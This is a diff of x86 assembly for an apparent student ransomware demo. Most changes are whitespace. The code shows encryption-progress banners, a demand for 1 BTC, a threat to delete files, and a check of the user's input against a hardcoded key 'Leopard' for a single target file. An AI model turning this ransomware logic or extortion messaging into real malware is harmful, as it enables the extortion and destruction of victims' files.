@@ -1,14 +1,14 @@
 section .data
     Encryption_Progress db "+----------------------------------------------------------+", 13, 10,
-    					db "| [**]  DEVELOPED BY: 231290, 231296, 231338, 231334  [**] |", 13, 10,
-    					db "+----------------------------------------------------------+", 13, 10,
-    					db "| [!] ALERT: ENCRYPTING ALL YOUR FILES !!!                 |", 13, 10,
-    					db "| [+] TASK-PROGRESS: 20%   (1.Starting Quantum Computers)  |", 13, 10,
-    					db "| [+] TASK-PROGRESS: 40%   (2.Calculating Files Hashes)    |", 13, 10,
-    					db "| [+] TASK-PROGRESS: 60%   (3.Finding your Personal Files) |", 13, 10,
-    					db "| [+] TASK-PROGRESS: 80%   (4.Initating Encryption Process)|", 13, 10,
-    					db "| [+] TASK-COMPLETE: 100%  (5.Encrypting your Secret File) |", 13, 10,
-    					db "+----------------------------------------------------------+", 13, 10, 0
+    			db "| [**]  DEVELOPED BY: 231290, 231296, 231338, 231334  [**] |", 13, 10,
+    			db "+----------------------------------------------------------+", 13, 10,
+    			db "| [!] ALERT: ENCRYPTING ALL YOUR FILES !!!                 |", 13, 10,
+    			db "| [+] TASK-PROGRESS: 20%   (1.Starting Quantum Computers)  |", 13, 10,
+    			db "| [+] TASK-PROGRESS: 40%   (2.Calculating Files Hashes)    |", 13, 10,
+    			db "| [+] TASK-PROGRESS: 60%   (3.Finding your Personal Files) |", 13, 10,
+    			db "| [+] TASK-PROGRESS: 80%   (4.Starting Encryption Process) |", 13, 10,
+    			db "| [+] TASK-COMPLETE: 100%  (5.Encrypting your Secret File) |", 13, 10,
+    			db "+----------------------------------------------------------+", 13, 10, 0
     Encryption_Progress_len EQU $ - Encryption_Progress
     Decryption_Message db "| [+] INFO: ENCRYPTION SUCCESSFUL!!                        |", 13, 10,
                        db "| [!] SEND ME 1 BTC TO HAVE THE KEY TO DECRYPT YOUR FILES  |", 13, 10,
@@ -25,14 +25,14 @@ section .data
     InputFailedMessage db "| [-] ALERT: Couldn't Take input of the Key Correctly. OOPS!", 13, 10, 0h
     InputFailedMessageLen EQU $ - InputFailedMessage
     Incorrect_key db "+----------------------------------------------------------+", 13, 10,
-    			  db "| [-] ALERT: INCORRECT KEY. Your Files will be Deleted Now |", 13, 10,
-    			  db "+----------------------------------------------------------+", 13, 10, 0h
+    		  db "| [-] ALERT: INCORRECT KEY. Your Files will be Deleted Now |", 13, 10,
+    		  db "+----------------------------------------------------------+", 13, 10, 0h
     Incorrect_key_len EQU $ - Incorrect_key
     Correct_Key_Input db "+----------------------------------------------------------+", 13, 10,
-    				  db "| [+] ALERT: CORRECT KEY. Your Files are being Decrypted!! |", 13, 10, 0h
+    		      db "| [+] ALERT: CORRECT KEY. Your Files are being Decrypted!! |", 13, 10, 0h
     Correct_Key_Input_len EQU $ - Correct_Key_Input
     Decryption_Successfull db "+----------------------------------------------------------+", 13, 10,
-    					   db "| [+] CONGRATS: FILES DECRYPTED SUCCESSFULLY. ENJOY!!      |", 13, 10,
+    			   db "| [+] CONGRATS: FILES DECRYPTED SUCCESSFULLY. ENJOY!!      |", 13, 10,
                            db "+----------------------------------------------------------+", 13, 10, 0h
     Decryption_Successfull_len EQU $ - Decryption_Successfull
     TargetFile db "./Target-Dir/TargetFile.txt", 0h
@@ -57,7 +57,7 @@ _start:
 	lea esi, [Encryption_Progress]              ; Pointer to message to be Printed
 	mov edi, Encryption_Progress_len            ; Message length
 PRINT_LOOP:
-	cmp edi, 0                                  ; check if Characters ended
+    cmp edi, 0                                  ; check if Characters ended
     je CONTINUE_PROCESSING                      ; If Yes, Move to Encryption part
 
     mov eax, 4                                  ; Write System Call
@@ -137,20 +137,20 @@ DECRYPTION_MESSAGE:
     mov edx, Decryption_Message_len             ; Message Length
     int 0x80                                    ; System Call
 
-	mov eax, 3                                  ; Read System Call
-	mov ebx, 0                                  ; File Descriptor (StdIn)
-	mov ecx, Key_Guess_Input                    ; Variable to store to input in
-	mov edx, 20                                 ; Size of input to read
-	int 0x80                                    ; System Call
-	test eax, eax                               ; Check if Input taken Correctly
-	jz Input_Failed_Call                        ; Jump to Failed Input if error
+    mov eax, 3                                  ; Read System Call
+    mov ebx, 0                                  ; File Descriptor (StdIn)
+    mov ecx, Key_Guess_Input                    ; Variable to store to input in
+    mov edx, 20                                 ; Size of input to read
+    int 0x80                                    ; System Call
+    test eax, eax                               ; Check if Input taken Correctly
+    jz Input_Failed_Call                        ; Jump to Failed Input if error
 
-	mov ecx, 7                                  ; Mov 7 in ECX to Iterate over 7 letters of the Key
-	lea esi, [Key_Guess_Input]                  ; Pointer to the user input
-	lea edi, [Correct_Key_Value]                ; Pointer to the correct key "Leopard"
+    mov ecx, 7                                  ; Mov 7 in ECX to Iterate over 7 letters of the Key
+    lea esi, [Key_Guess_Input]                  ; Pointer to the user input
+    lea edi, [Correct_Key_Value]                ; Pointer to the correct key "Leopard"
 
 Key_Checking_loop:
-	mov al, [esi]                               ; Load the current byte from user input
+    mov al, [esi]                               ; Load the current byte from user input
     mov bl, [edi]                               ; Load the current byte from the correct key
     cmp al, bl                                  ; Compare the bytes
     jne INCORRECT_KEY_INPUT                     ; Jump if the characters don't match
